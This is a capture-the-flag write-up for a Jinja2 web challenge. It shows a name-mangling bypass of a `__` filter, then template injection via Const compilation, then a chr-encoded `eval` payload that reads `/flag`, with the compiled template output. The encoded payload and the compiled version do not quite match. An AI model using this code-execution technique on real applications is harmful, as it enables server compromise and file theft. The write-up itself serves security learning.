# writeup

First of all, we have to bypass the `__` check in the name. The catch here is that python actually mangles names if they're starting with `__`.
```python
In [1]: class Test:
   ...:     def __hidden() -> None:
   ...:         pass
   ...:

In [2]: dir(Test())
Out[2]:
['_Test__hidden',
 ...]
```

And because of that, we can pass the `_Renderer__old` value to `method` post form data to call the old renderer, which would give us an access to exploit SSTI.

In the isinstance hook it returns true for some of the isinstance checks within jinja2, if we look a bit closer how jinja [compiles](https://github.com/pallets/jinja/blob/7277d8068be593deab3555c7c14f974ada373af1/src/jinja2/compiler.py#L1628C1-L1633C34) `Const` nodes, we can see this part of code:

```python
    def visit_Const(self, node: nodes.Const, frame: Frame) -> None:
        val = node.as_const(frame.eval_ctx)
        if isinstance(val, float):
            self.write(str(val))
        else:
            self.write(repr(val))
```

As you may know, jinja translates its templates to the python code, then it executes it and that's how its "rendering" stuff.

When we are writing constants, it repr's it so that `asd` would turn to `'asd'`, etc.
But for floats, it just writes its str value, which is completely reasonable and understandable why, but with this isinstance hook, it would always return true there.

Because of that, we can embed the python code directly to the compiled version of a template using the string consts.

To bypass the filters, we can use `{% if 1 == 1 %}{% endif %}` and emit the code as a bunch of `chr`s.

Which gives us the payload:
```python
In [4]: m = "open('/flag').read()"

In [5]: c = ''
   ...: for i, x in enumerate(m):
   ...:     if i > 0:
   ...:         c += '+'
   ...:     c += f'chr({ord(x)})'
   ...:
```

`{% if "1 == 1: yield eval(chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(39)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41))\n    if 1 == 1" %}{% endif %}`

Which then will be compiled to
```python
from jinja2.runtime import AsyncLoopContext, LoopContext, Macro, Markup, Namespace, TemplateNotFound, TemplateReference, TemplateRuntimeError, Undefined, auto_aiter, auto_await, escape, identity, internalcode, markup_join, missing, str_join
name = None

async def root(context, missing=missing, environment=environment):
    resolve = context.resolve_or_missing
    undefined = environment.undefined
    concat = environment.concat
    cond_expr_undefined = Undefined
    if 0: yield None
    pass
    yield '<html>\n<head>\n    <title>Shippering!</title>\n    <link href="static/styles.css" rel="stylesheet">\n</head>\n<body>\n    <div id="wrapper">\n        <div id="content">\n            <h1>aloha!</h1>\n            <pre>Welcome to the automated fanfic generator.</pre>\n\n            <form action="/" method="post">\n                <input type="hidden" id="encoding" name="encoding" value="utf-8">\n\n                <div class="content_2">\n                    <b>Person 1:</b> <input id="person_1" name="person_1">\n                </div>\n\n                <div class="content_2">\n                    <b>Person 2:</b> <input id="person_2" name="person_2">\n                </div>\n\n                <div class="content_2">\n                    <button type="submit">submit</button>\n                </div>\n            </form>\n\n            <div class="content_2">\n                <pre>A playful argument, a shared laugh, '
    if 1 == 1: yield eval(chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(39)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(41))
    if 1 == 1:
        pass
    yield " and  's eyes met, and it was as if no one else was there.</pre>\n            </div>\n        </div>\n    </div>\n</body>\n</html>"

blocks = {}
debug_info = '29=12'
```
